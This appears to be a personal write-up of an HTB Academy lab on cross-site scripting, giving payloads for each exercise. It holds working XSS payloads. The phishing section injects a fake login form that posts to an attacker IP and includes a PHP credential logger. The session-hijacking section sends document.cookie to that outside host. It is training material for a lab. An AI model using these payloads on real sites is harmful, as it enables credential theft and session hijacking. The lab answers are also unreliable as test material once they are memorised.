# [HTB_Academy] Cross-Site Scripting (XSS)

## Stored XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```javascript
<script>alert(document.cookie)</script>
```

## Reflected XSS

>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```javascript
<script>alert(document.cookie)</script>
```

## DOM XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```javascript
<img src="" onerror=alert(document.cookie)>
```

## XSS Discovery

>**Q. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter? **

>**Q. What type of XSS was found on the above server? "name only"**

## Phishing

>**Q. Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

```bash
http://10.129.252.57/phishing/index.php?url=<script>alert(window.origin)</script>
```

```bash
http://10.129.252.57/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://10.10.14.46><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

```bash
http://10.129.252.57/phishing/index.php?url=%27/%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.14.46:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

## Session Hijacking

>**Q. Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**
Look for the payload

```javascript
"><script src=http://10.10.14.46:3333></script>
```

Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

Look for the position
```javascript
"><script src=http://10.10.14.46:3333/fullname></script>
"><script src=http://10.10.14.46:3333/username></script>
"><script src=http://10.10.14.46:3333/password></script>
"><script src=http://10.10.14.46:3333/url></script>
```

```javascript
new Image().src='http://10.10.14.46:3333/index.php?c='+document.cookie
```

Click on "+" to add the cookie

## Skills Assessment

>**Q. What is the value of the 'flag' cookie?**
